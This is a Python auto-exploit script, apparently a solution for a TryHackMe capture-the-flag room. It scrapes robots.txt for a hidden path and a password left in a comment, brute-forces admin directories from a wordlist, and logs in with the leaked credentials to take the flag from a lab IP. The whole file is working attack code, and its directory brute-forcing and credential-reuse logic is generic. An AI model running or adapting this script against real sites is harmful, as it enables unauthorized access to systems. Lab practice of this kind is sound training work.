#!/usr/bin/env python3
"""
Hidden Deep Into my Heart — CTF Auto-Exploit
TryHackMe | by 0xb0rn3

Attack chain:
  1. Fetch /robots.txt  -> extract hidden path + leaked password
  2. Brute-force subdirs under the vault path via wordlist
  3. POST credentials to the admin panel
  4. Extract and print the flag
"""

__author__  = "0xb0rn3"
__version__ = "1.0.0"

import re
import sys
import argparse
import requests
from urllib.parse import urljoin

# ── Colours ──────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

def ok(msg):   print(f"{GREEN}[+]{RESET} {msg}")
def info(msg): print(f"{CYAN}[*]{RESET} {msg}")
def warn(msg): print(f"{YELLOW}[!]{RESET} {msg}")
def fail(msg): print(f"{RED}[-]{RESET} {msg}")


# ── Step 1: robots.txt ───────────────────────────────────────────────────────

def fetch_robots(session, base_url):
    """Fetch robots.txt and extract disallowed paths and any commented secrets."""
    url = urljoin(base_url, "/robots.txt")
    info(f"Fetching {url}")
    r = session.get(url, timeout=10)
    if r.status_code != 200:
        fail(f"robots.txt returned HTTP {r.status_code}")
        return [], []

    ok(f"robots.txt content:\n{'-'*40}\n{r.text.strip()}\n{'-'*40}")

    disallowed = re.findall(r"(?i)^Disallow:\s*(.+)$", r.text, re.MULTILINE)
    disallowed = [p.strip().rstrip("*").rstrip("/") for p in disallowed]

    comments = re.findall(r"#\s*(.+)", r.text)

    if disallowed:
        ok(f"Disallowed paths found: {disallowed}")
    if comments:
        ok(f"Comments (potential secrets): {comments}")

    return disallowed, comments


# ── Step 2: directory brute-force ────────────────────────────────────────────

FALLBACK_WORDLIST = [
    "administrator", "admin", "login", "panel", "dashboard",
    "manager", "user", "users", "account", "accounts",
    "portal", "console", "control", "secret", "private",
]

def bruteforce_path(session, base_url, vault_path, wordlist_path=None):
    """Brute-force sub-paths under vault_path; return first 200 hit."""
    target = urljoin(base_url, vault_path + "/")
    info(f"Directory brute-force on {target}")

    if wordlist_path:
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                words = [line.strip() for line in f if line.strip()]
            info(f"Loaded {len(words)} words from {wordlist_path}")
        except FileNotFoundError:
            warn(f"Wordlist not found: {wordlist_path} — using built-in list")
            words = FALLBACK_WORDLIST
    else:
        words = FALLBACK_WORDLIST
        info(f"Using built-in wordlist ({len(words)} words)")

    for word in words:
        url = urljoin(target, word)
        try:
            r = session.get(url, timeout=8, allow_redirects=True)
            if r.status_code == 200:
                ok(f"Found: {url}  (HTTP 200, {len(r.content)} bytes)")
                return url
        except requests.RequestException:
            continue

    fail("No admin panel found via brute-force.")
    return None


# ── Step 3: login & flag extraction ─────────────────────────────────────────

def login_and_get_flag(session, admin_url, username, password):
    """POST credentials to the admin panel and extract the flag."""
    info(f"Attempting login at {admin_url}")
    info(f"Credentials: {username} / {password}")

    payload = {"username": username, "password": password}
    r = session.post(admin_url, data=payload, timeout=10, allow_redirects=True)

    if r.status_code != 200:
        fail(f"Login returned HTTP {r.status_code}")
        return None

    # Try common flag formats: THM{...}, FLAG{...}, CTF{...}, HTB{...}
    flag_match = re.search(r"((?:THM|FLAG|CTF|HTB)\{[^}]+\})", r.text)
    if flag_match:
        return flag_match.group(1)

    # Fallback: look for any {...} token that looks like a flag
    generic = re.search(r"\{[A-Za-z0-9_!@#$%^&*]+\}", r.text)
    if generic:
        warn(f"Non-standard flag format detected: {generic.group(0)}")
        return generic.group(0)

    fail("Login succeeded but no flag pattern found in response.")
    info("Response snippet:")
    print(r.text[:800])
    return None


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Auto-exploit for 'Hidden Deep Into my Heart' CTF"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="http://10.49.169.158:5000",
        help="Base URL of the target (default: http://10.49.169.158:5000)",
    )
    parser.add_argument(
        "-w", "--wordlist",
        default=None,
        help="Path to directory brute-force wordlist (optional)",
    )
    parser.add_argument(
        "-u", "--username",
        default="admin",
        help="Username to try (default: admin)",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")

    print(f"""
{CYAN}{'='*55}
  Hidden Deep Into my Heart — Auto-Exploit
  by 0xb0rn3
  Target: {base_url}
{'='*55}{RESET}
""")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (CTF-Exploit)"})

    # ── 1. robots.txt ────────────────────────────────────────────────────────
    disallowed, comments = fetch_robots(session, base_url)

    vault_path = None
    for path in disallowed:
        if path:
            vault_path = path
            break

    if not vault_path:
        fail("Could not determine vault path from robots.txt. Trying /cupids_secret_vault")
        vault_path = "/cupids_secret_vault"

    # Treat the first comment as a potential password
    leaked_password = comments[0].strip() if comments else None
    if leaked_password:
        ok(f"Leaked password candidate: {leaked_password}")
    else:
        warn("No password comment found in robots.txt")

    # ── 2. Directory brute-force ─────────────────────────────────────────────
    admin_url = bruteforce_path(session, base_url, vault_path, args.wordlist)
    if not admin_url:
        sys.exit(1)

    # ── 3. Login ─────────────────────────────────────────────────────────────
    if not leaked_password:
        fail("No password to try. Exiting.")
        sys.exit(1)

    flag = login_and_get_flag(session, admin_url, args.username, leaked_password)

    # ── Result ───────────────────────────────────────────────────────────────
    print()
    if flag:
        print(f"{GREEN}{'='*55}")
        print(f"  FLAG CAPTURED: {flag}")
        print(f"{'='*55}{RESET}")
    else:
        fail("Could not capture the flag.")
        sys.exit(1)


if __name__ == "__main__":
    main()
